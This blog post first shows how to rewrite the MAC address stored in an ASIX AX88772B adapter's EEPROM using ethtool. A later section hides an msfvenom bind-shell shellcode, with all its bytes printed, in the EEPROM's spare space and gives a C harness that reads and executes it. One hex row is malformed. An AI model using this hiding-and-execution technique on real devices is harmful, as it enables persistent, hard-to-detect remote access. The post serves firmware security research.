---
layout: posts
title:  "MAC Address Changing Revisited"
date:   2022-05-22 00:00:00 -0600
categories: eeprom nic
author: Nicholas Starke
---

My new friend [Gundiuc Oleg](https://twitter.com/GundiucO) reached out to me regarding [an older blog post I wrote](/networking/mac-address/ethtool/2019/09/21/ethtool-change-mac-address-permanently.html) about permanently changing MAC addresses on NICs.  Gundiuc was targeting the AX88772B chipset on USB ethernet adapters.  If you're interested in following along, I used [this USB Ethernet adapter](https://www.amazon.com/gp/product/B00MYT481C) for testing (no affiliate link - I don't make any money if you buy one).

The purpose of this article is to demonstrate some techniques for permanently changing MAC addresses on this chipset in more detail than the previous post.  

The first thing we need to do is identify the NIC "magic" quad-word.  The [Linux kernel driver for ASIX based NICs](https://github.com/torvalds/linux/blob/master/drivers/net/usb/asix.h#L158) tells us this value is **0xdeadbeef**. We will use this value to write data to the EEPROM on the chipset. For reference, my NIC is id'd as **enx000ec646478d**

Now, when we run **ethtool -e enx000ec646478d** we are greeted with the following output:

```
Offset		Values
------		------
0x0000:		15 8f ec 71 20 12 29 27 00 0e c6 46 47 8d 09 04 
0x0010:		60 22 71 12 19 0e 3d 04 3d 04 3d 04 3d 04 7c 05 
0x0020:		00 06 10 e0 54 24 40 12 49 27 ff ff 00 00 ff ff 
0x0030:		ff ff 0e 03 30 00 30 00 30 00 33 00 38 00 37 00 
0x0040:		12 01 00 02 ff ff 00 40 95 0b 20 77 01 00 01 02 
0x0050:		03 01 09 02 27 00 01 01 04 a0 7d 09 04 00 00 03 
0x0060:		ff ff 00 07 07 05 81 03 08 00 0b 07 05 82 02 00 
0x0070:		02 00 07 05 03 02 00 02 00 ff 04 03 30 00 ff ff 
0x0080:		12 01 00 02 ff ff 00 08 95 0b 20 77 01 00 01 02 
0x0090:		03 01 09 02 27 00 01 01 04 a0 08 09 04 00 00 03 
0x00a0:		ff ff 00 07 07 05 81 03 08 00 a0 07 05 82 02 40 
0x00b0:		00 00 07 05 03 02 40 00 00 dd ff ff aa aa bb bb 
0x00c0:		22 03 41 00 53 00 49 00 58 00 20 00 45 00 6c 00 
0x00d0:		65 00 63 00 2e 00 20 00 43 00 6f 00 72 00 70 00 
0x00e0:		2e 00 12 03 41 00 58 00 38 00 38 00 37 00 37 00 
0x00f0:		32 00 41 00 ff ff ff ff ff ff ff ff ff ff ff ff 
0x0100:		ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff 
0x0110:		ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff 
0x0120:		ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff 
0x0130:		ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff 
0x0140:		00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
0x0150:		00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
0x0160:		00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
0x0170:		00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
0x0180:		00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
0x0190:		00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
0x01a0:		00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
0x01b0:		00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
0x01c0:		00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
0x01d0:		00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
0x01e0:		00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
0x01f0:		00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
```

Now this is a nice hexdump of the EEPROM data for human consumption, but if we want the raw binary bytes, we need to run **ethtool** like so:

```
# ethtool -e enx000ec646478d raw on > eeprom.bin
```

This will give us the EEPROM dump as binary data.  We can then use our favorite hex editor to change the six byte MAC address at offset **0x8** into the EEPROM dump.  A quick note, the NIC chipset [expects data to be read](https://github.com/torvalds/linux/blob/master/drivers/net/usb/asix_common.c#L693) in **0x10** byte incremenets, so we are not able to write directly to **0x8**, we must read the first 0x10 bytes and modify the six bytes starting at 0x8.  My recommendation is to read out the full contents of the EEPROM then use a hex editor to modify just the bytes you wish to modify.  Keep in mind the full EEPROM dump length [must equal](https://github.com/torvalds/linux/blob/master/drivers/net/usb/asix.h#L159) **0x200** (decimal 512).  I mention this because sometimes when I use vim in xxd mode, the conversion back to binary results in an extra newline character being appended to the end of whatever binary data I am working with.  So just as a sanity check, run **ls -l eeprom.bin** to ensure the file size is **512**.

After we have made our modifications to eeprom.bin, we need to flash those changes to the chipset.  The command to do so in this instance is:

```
# ethtool -E enx000ec646478d magic 0xdeadbeef < eeprom.bin
```

# Hiding payloads

There was a [great presentation](https://www.youtube.com/watch?v=KDo3CExd8Ns) at DEFCON 28 by Jesse Michael and Mickey Shkatov about hiding binary payloads in firmware.  This firmware chipset can be used to accomplish this goal.  Take for example the output of the following command:

```
$ msfvenom --payload linux/x86/shell/bind_tcp | xxd
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 111 bytes

00000000: 6a7d 5899 b207 b900 1000 0089 e366 81e3  j}X..........f..
00000010: 00f0 cd80 31db f7e3 5343 536a 0289 e1b0  ....1...SCSj....
00000020: 66cd 8051 6a04 546a 026a 0150 9789 e16a  f..Qj.Tj.j.P...j
00000030: 0e5b 6a66 58cd 8089 f883 c414 595b 5e52  .[jfX.......Y[^R
00000040: 6802 0011 5c6a 1051 5089 e16a 6658 cd80  h...\j.QP..jfX..
00000050: d1e3 b066 cd80 5743 b066 8951 04cd 8093  ...f..WC.f.Q....
00000060: b60c b003 cd80 87df 5bb0 06cd 80ff e1    ........[......
```

This is a 111 byte payload. We can make the last byte a NOP (0x90) in order to conform to the 16-byte alignment constraint.  That would result in:

```
00000000: 6a7d 5899 b207 b900 1000 0089 e366 81e3  j}X..........f..
00000010: 00f0 cd80 31db f7e3 5343 536a 0289 e1b0  ....1...SCSj....
00000020: 66cd 8051 6a04 546a 026a 0150 9789 e16a  f..Qj.Tj.j.P...j
00000030: 0e5b 6a66 58cd 8089 f883 c414 595b 5e52  .[jfX.......Y[^R
00000040: 6802 0011 5c6a 1051 5089 e16a 6658 cd80  h...\j.QP..jfX..
00000050: d1e3 b066 cd80 5743 b066 8951 04cd 8093  ...f..WC.f.Q....
00000060: b60c b003 cd80 87df 5bb0 06cd 80ff e190  ........[.......
```

 From the EEPROM dump, all bytes past 0x140 (320 decimal) are null bytes. We could write our msfvenom payload to offset 0x190.  Then the EEPROM dump would look like this:

 ```
0x0000:		15 8f ec 71 20 12 29 27 00 0e c6 46 47 8d 09 04 
0x0010:		60 22 71 12 19 0e 3d 04 3d 04 3d 04 3d 04 7c 05 
0x0020:		00 06 10 e0 54 24 40 12 49 27 ff ff 00 00 ff ff 
0x0030:		ff ff 0e 03 30 00 30 00 30 00 33 00 38 00 37 00 
0x0040:		12 01 00 02 ff ff 00 40 95 0b 20 77 01 00 01 02 
0x0050:		03 01 09 02 27 00 01 01 04 a0 7d 09 04 00 00 03 
0x0060:		ff ff 00 07 07 05 81 03 08 00 0b 07 05 82 02 00 
0x0070:		02 00 07 05 03 02 00 02 00 ff 04 03 30 00 ff ff 
0x0080:		12 01 00 02 ff ff 00 08 95 0b 20 77 01 00 01 02 
0x0090:		03 01 09 02 27 00 01 01 04 a0 08 09 04 00 00 03 
0x00a0:		ff ff 00 07 07 05 81 03 08 00 a0 07 05 82 02 40 
0x00b0:		00 00 07 05 03 02 40 00 00 dd ff ff aa aa bb bb 
0x00c0:		22 03 41 00 53 00 49 00 58 00 20 00 45 00 6c 00 
0x00d0:		65 00 63 00 2e 00 20 00 43 00 6f 00 72 00 70 00 
0x00e0:		2e 00 12 03 41 00 58 00 38 00 38 00 37 00 37 00 
0x00f0:		32 00 41 00 ff ff ff ff ff ff ff ff ff ff ff ff 
0x0100:		ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff 
0x0110:		ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff 
0x0120:		ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff 
0x0130:		ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff 
0x0140:		00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
0x0150:		00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
0x0160:		00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
0x0170:		00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
0x0180:		00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
0x0190:		6a 7d 58 99 b2 07 b9 00 10 00 00 89 e3 66 81 e3 
0x01a0:		00 f0 cd 80 31 db f7 e3 53 43 53 6a 02 89 e1 b0 
0x01b0:		66 cd 80 51 6a 04 54 6a 02 6a 01 50 97 89 e1 6a 
0x01c0:		0e 5b 6a 66 58 cd 80 89 f8 83 c4 14 59 5b 5e 52 
0x01d0:		68 02 00 11 5c 6a 10 51 50 89 e1 6a 66 58 cd 80 
0x01e0:		d1e 3 b0 66 cd 80 57 43 b0 66 89 51 04 cd 80 93 
0x01f0:		b6 0c b0 03 cd 80 87 df 5b b0 06 cd 80 ff e1 90
 ```

 At this point, after this data is flashed to the NIC EEPROM, it is possible to use **ethtool** to retrieve the msfvenom payload and then execute it.  For this particular chipset, we have 192 (0xc0) bytes to store a payload.  That is from EEPROM offset 0x140 to the end of the EEPROM data at 0x200.  

 Here is some example C code to demonstrate how this works.

 ```c++
#include <stdio.h>
#include <stdlib.h>

#define SHELL_CODE_START 400
#define ETHTOOL_OUTPUT_LENGTH 512

int main(int argc, char **argv) {
    FILE *fp;
    unsigned char buffer[ETHTOOL_OUTPUT_LENGTH + 1];
    void(*shell_code)();

    fp = popen("ethtool -e enx000ec646478d raw on", "r");
    if (!fp) {
	    perror("popen");
    }

    fgets(buffer, sizeof(buffer), fp);
    
    pclose(fp);
    
    shell_code = (void(*)()) (buffer + SHELL_CODE_START);
    printf("running shell code\n");
    (shell_code)();

    return 0;
}
 ```

 This code will need to be compiled with gcc as such:

 ```
 $ gcc -o harness -m32 -z execstack harness.c
 ```

 The **-m32** is because the shellcode is **x86** targeted in the example above.

 The **-z execstack** is necessary because we are storing the shell code in a local variable, which is located on the stack.  Therefore, we are executing directly off the stack in this example.  This could be easily fixed by using **mmap** and executing from somewhere else in memory.

 Happy hacking!